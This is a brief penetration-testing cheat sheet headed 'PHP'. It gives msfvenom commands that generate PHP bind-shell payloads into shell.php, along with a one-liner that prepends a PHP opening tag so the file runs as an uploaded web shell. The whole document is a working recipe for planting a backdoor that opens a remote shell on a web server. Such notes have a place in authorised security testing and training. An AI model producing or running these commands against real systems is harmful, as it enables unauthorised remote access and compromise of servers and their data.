# PHP

`$ msfvenom -p php/bind_php lhost=<IP> lport=<PORT> -f raw -o shell.php`

`$ msfvenom -p php/bind_perl lport=<PORT> -f raw -o shell.php`

`$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php`